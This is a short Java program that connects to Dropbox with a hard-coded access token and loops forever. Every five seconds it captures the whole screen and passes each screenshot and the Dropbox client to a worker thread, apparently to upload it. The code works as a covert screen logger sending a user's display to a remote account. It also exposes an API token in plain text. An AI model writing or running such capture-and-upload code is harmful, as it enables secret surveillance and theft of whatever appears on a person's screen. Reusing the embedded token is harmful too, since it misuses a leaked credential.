import com.dropbox.core.DbxRequestConfig;
import com.dropbox.core.v2.DbxClientV2;
import java.awt.*;
import java.awt.image.BufferedImage;

public class Main {

    private static final String ACCESS_TOKEN = "oasnp83OXasAAAAAAAAAAUpGFgI0epRIUHd2iopBJvRvhPijMDqDz6WdtvoPspJp";

    public static void main(String[] args) {
        DbxRequestConfig config = DbxRequestConfig.newBuilder("dropbox/java-tutorial").build();
        DbxClientV2 client = new DbxClientV2(config, ACCESS_TOKEN);
        while (true) {
            try {
                BufferedImage image = new Robot().createScreenCapture(
                        new Rectangle(Toolkit.getDefaultToolkit().getScreenSize()));
                MyThread thread = new MyThread(client, image);
                thread.start();
                Thread.sleep(5000);
            } catch (Exception e) {
                e.printStackTrace();
            }
        }
    }
}